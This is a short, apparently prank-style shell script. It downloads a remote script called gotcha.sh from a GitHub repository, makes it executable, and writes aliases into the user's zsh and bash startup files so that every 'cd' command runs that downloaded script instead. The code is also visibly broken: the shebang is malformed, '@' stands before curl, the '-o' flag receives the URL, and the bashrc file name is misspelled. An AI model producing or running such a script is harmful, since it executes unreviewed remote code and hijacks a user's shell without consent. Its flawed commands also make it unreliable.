#bin/bash
@curl -s -o https://raw.githubusercontent.com/jkauker/gotcha/master/gotcha.sh > ~/gotcha.sh
chmod +x ~/gotcha.sh
echo "alias cd='bash ~/gotcha.sh'" >> ~/.zshrc
echo "alias cd='bash ~/gotcha.sh'" >> ~/.bashhrc